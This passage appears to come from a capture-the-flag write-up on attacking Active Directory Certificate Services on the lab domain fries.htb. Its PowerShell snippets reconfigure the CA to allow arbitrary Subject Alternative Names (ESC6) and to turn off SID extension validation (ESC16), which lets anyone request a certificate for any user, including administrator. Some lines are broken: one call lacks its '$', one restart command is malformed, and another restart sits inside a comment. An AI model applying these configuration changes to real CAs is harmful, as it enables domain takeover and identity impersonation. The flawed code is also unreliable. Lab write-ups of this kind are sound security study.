make `User Specified SAN  : Enabled`, enable the `EDITF_ATTRIBUTESUBJECTALTNAME2`.
```powershell
# 1. Connect to the CA Admin Interface
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"

# 2. Get the current EditFlags value
$current = $CA.GetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags")

# 3. Add the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (Value: 0x40000)
# We use -bor (Bitwise OR) to add the permission without breaking existing settings
$new = $current -bor 0x00040000

# 4. Write the new configuration back to the CA
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new)

# 5. Restart the Service to apply the change
Restart-Service certsvc -Force

# 6. Verify
Write-Host "New Flags Value: $new"
```

-- OR --

ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

Principle: Enables the ability to specify an arbitrary Subject Alternative Name (SAN) in certificate requests.

Configuration with COM API:
```powershell
# Using CertificateAuthority.Admin COM object

$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"
# Calculate the new value
$current = 1114446  # Current value
$new = $current -bor 0x00040000
# Add EDITF_ATTRIBUTESUBJECTALTNAME2 flag (262144)
# New value = 1376590 (0x15014E) # Apply modification
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new)
# Restart CA service Restart-Service certsvc -Force
```

#### Verification:

```powershell
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
```
This should display EditFlags with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled.


---

### ESC16 — Disable Extension List
Principle: Disables verification of certain certificate extensions, notably the szOID_NTDS_CA_SECURITY_EXT extension that validates the SID in the certificate.
```powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"
# Disable validation of extension 1.3.6.1.4.1.311.25.2 (szOID_NTDS_CA_SECURITY_EXT)

CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2")

# Restart CA

service Restart-Service certsvc -Force
```
### Verification

```
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\DisableExtensionList
```

Why these two misconfigurations?
- ESC6 allows specifying an arbitrary UPN (e.g., administrator@fries.htb) in the certificate
- ESC16 prevents SID validation in the certificate, allowing identity impersonation Combined, they allow requesting a certificate for any user
